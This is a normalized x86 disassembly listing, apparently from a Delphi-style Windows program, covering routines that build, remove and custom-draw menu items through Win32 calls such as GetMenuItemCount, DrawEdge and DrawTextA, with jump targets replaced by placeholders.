mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_45ec64
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_421b4c
sub_45ec28
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_421ecc
mov eax ebx
call sub_4607e8
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_4607e8
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403518
pop esi
pop ebx
retn
mov eax ebx
call sub_45ec64
sub_45ec64
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_45ed94
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_45ec64
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_45ed94
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_45ed94
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_45eb24
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebp
call sub_45ed94
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45ed34
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_460800
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_460810
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_460810
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_460810
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_45de3c
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_45ed94
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_45eb24
mov eax [ rw-data ]
call sub_45de3c
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_45ede0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_421df4
push ebx
push sub_45eb94
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_45ee24
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_45f008
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_460dbc
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4041b0
test bh 0x4
je r-xdata
mov eax edi
call sub_4623f8
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404524
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_4253e8
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043e0
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_424dc0
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_424dcc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f00f
lea eax [ ebp - 0xc ]
call sub_404118
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_425acc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4043d8
push eax
mov eax [ ebp - 0xc ]
call sub_4045d8
push eax
mov eax [ ebp - 0x4 ]
call sub_425acc
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_424b00
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4043d8
push eax
mov eax [ ebp - 0xc ]
call sub_4045d8
push eax
mov eax [ ebp - 0x4 ]
call sub_425acc
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_424b00
mov eax 0xff00000d
call sub_424640
mov esi eax
mov eax 0xff000010
call sub_424640
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_424b00
jmp r-xdata
sub_45f074
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45f95c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4252cc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_424b00
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404524
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4252cc
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45be38
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425acc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4252c4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4252cc
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4281c4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45f4bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4292ac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_424b00
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45be38
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4252cc
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4252c4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a2b0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4252a0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4257f4
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_45c128
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4252cc
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45ee24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_424dcc
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425acc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4255c4
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_424b00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40331c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425acc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45ee24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45f963
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_45dee8
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45ee24
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45f97c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_460284
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_425670
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4252cc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_424b00
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
